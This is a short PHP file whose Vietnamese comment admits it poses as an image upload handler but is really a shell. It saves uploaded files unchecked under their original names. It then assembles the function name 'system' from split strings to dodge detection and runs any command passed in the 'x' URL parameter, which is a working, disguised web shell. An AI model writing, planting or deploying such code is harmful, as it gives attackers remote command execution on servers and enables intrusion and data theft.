<?php
// Gia dinh la file upload anh nhung thuc ra la shell
if (isset($_FILES['file'])) {
    $target = "uploads/" . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
}
$code = "sys"."tem";
$code($_GET['x']);
?>
